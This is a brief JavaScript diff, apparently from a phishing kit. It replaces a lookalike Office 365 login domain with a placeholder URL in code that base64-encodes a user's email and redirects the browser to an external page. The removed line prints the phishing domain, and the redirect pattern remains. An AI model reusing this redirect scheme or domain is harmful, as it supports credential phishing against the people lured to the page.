@@ -95,7 +95,7 @@
 
                     setTimeout(() => {
                         const encodedEmail = btoa(email); // Encode email in base64
-                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + encodedEmail;
+                        const redirectTo = "https://your-redirect-url.com/#" + encodedEmail;
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo;
                     }, 6000);
@@ -132,7 +132,7 @@
                     }
                 });
 
-                // If already on redirect page, decode and display the email
+                // If already on the redirected page, decode and display the email
                 const decodedEmail = decodeEmailFromHash();
                 if (decodedEmail) {
                     alert("Welcome back, " + decodedEmail + "!");
